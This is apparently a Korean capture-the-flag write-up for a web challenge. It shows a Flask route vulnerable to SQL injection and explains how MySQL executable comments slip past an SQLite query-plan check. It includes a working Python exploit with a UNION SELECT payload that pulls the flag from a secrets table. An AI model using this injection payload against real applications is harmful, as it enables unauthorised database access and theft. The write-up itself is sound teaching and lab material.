# defense-in-depth

## 코드 분석

### **app.py**

BLACKLIST 필터링, EXPLAIN QUERY PLAN 쿼리로 WAF가 걸려있다.

```python
@app.route('/info/<path:name>', methods=['GET'])
def get_user_info(name):
    if len(name) > 100:
        return jsonify({"Message": "Why the long name? Are you Tung Tung Tung Tung Tung Tung Tung Sahua????"}), 403
    try:
        db = get_db()
        cursor = db.cursor()
    except Exception:
        print(traceback.format_exc())
        return jsonify({"Error": "Something very wrong happened, either retry or contact organizers if issue persists!"}), 500

# Verify that the query is good and does not touch the secrets table

    query = f"SELECT * from users WHERE name = '{name}'"
    for item in BLACKLIST:
        if item in query:
            return jsonify({"Message": f"Probably sus"}), 403
    try:
        explain = "EXPLAIN QUERY PLAN " + query
        cursor.execute(explain)
        result = cursor.fetchall()
        if len(result) > 7:
            return jsonify({"Message": "Probably sus"}), 403
        for item in result:
            if "secrets" in item[3]:
                return jsonify({"Message": "I see where you're going..."}), 403
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({"Message": f"Probably sus"}), 403

# Now let the query through to the real production db

    cursor.close()

    try:
        cur = mysql.connection.cursor()
        cur.execute(query)
        records = cur.fetchall()[0]
        cur.close()
        return str(records)
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'Error': "It did not work boss!"}), 400
```

## Exploit

name 파라미터는 사용자 입력이 곧바로 SQL 쿼리 문자열 안에 삽입되기 때문에 SQL Injection이 가능한 지점이다. BLACKLIST 필터링만으로는 단순 키워드 우회가 가능하지만, 이 코드에서는 실제 SQL 쿼리 실행 전에 EXPLAIN QUERY PLAN을 사용해 쿼리 플랜을 분석하여 FLAG가 들어있는 secrets 테이블에 접근 시도 여부를 검사하기 때문에, 접근 시도가 감지되면 403 Forbidden 응답을 반환한다.

EXPLAIN QUERY PLAN을 실행하여 secrets 테이블 접근 여부를 검증하는 단계에서는 SQLite3이 사용되지만, 이 검증을 통과한 이후 실제 쿼리가 실행되고 데이터가 조회되는 단계에서는 MySQL이 사용된다. 이러한 구조로 인해 SQLite와 MySQL 간의 쿼리 파서 차이가 발생하며, SQLite에서는 해석되지 않는 MySQL의 힌트 구문(/*! ... */)을 이용해 검증을 우회할 수 있다. MySQL은 이 힌트 구문을 정상적으로 해석해 UNION SELECT 등의 구문을 실행하지만, SQLite에서는 이를 단순한 블록 주석(/* ... */)으로 처리하기 때문에 검증 단계에서는 차단되지 않고, 실행 단계에서만 동작하게 된다.

참고로, MySQL에서 key는 예약어이기 때문에 key를 컬럼 이름으로 사용하려면 반드시 백틱(`)으로 감싸주어야 한다.

```python
import requests

payload = "'/*! union select value, null, null from secrets where `key`='flag' */ order by '1"
url = "https://defense-in-depth.harkonnen.b01lersc.tf/info/" + payload

response = requests.get(url)
print(response.text)

# ('bctf{7h1s_1s_prob4bly_the_easiest_web_s0_go_s0lve_smt_3ls3_n0w!!!}', None, None)
```

## Reference

- [https://dev.mysql.com/doc/refman/8.0/en/comments.html](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
- [https://dev.mysql.com/doc/refman/8.0/en/keywords.html](https://dev.mysql.com/doc/refman/8.0/en/keywords.html)